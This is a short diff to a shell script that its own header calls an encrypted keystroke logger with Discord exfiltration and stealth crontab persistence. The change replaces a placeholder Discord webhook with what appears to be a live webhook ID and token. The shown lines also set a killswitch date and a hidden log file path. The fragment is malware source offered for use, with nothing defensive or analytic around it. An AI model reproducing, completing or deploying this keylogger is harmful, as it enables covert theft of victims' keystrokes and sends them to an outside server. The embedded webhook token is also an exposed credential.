@@ -4,7 +4,7 @@
 # Version: 1.0
 # Description: AES-encrypted keystroke logger with Discord exfil and stealth crontab persistence
 
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/XXXX/XXXX"
+DISCORD_WEBHOOK="https://discord.com/api/webhooks/1364536515954348032/3H6tkezlhYibD9CB6qAE62ON__BTvWcGEtuihmz7NylPZOhDYcjO0gq8BOuS-lLvDBBg"
 KILLSWITCH_EPOCH=$(date -d "2025-12-31 23:59:00" +%s)
 LOGFILE="$HOME/.local/share/.sysdump-$(uuidgen | cut -d'-' -f1)"
 ENCRYPTED_LOG="$LOGFILE.enc"
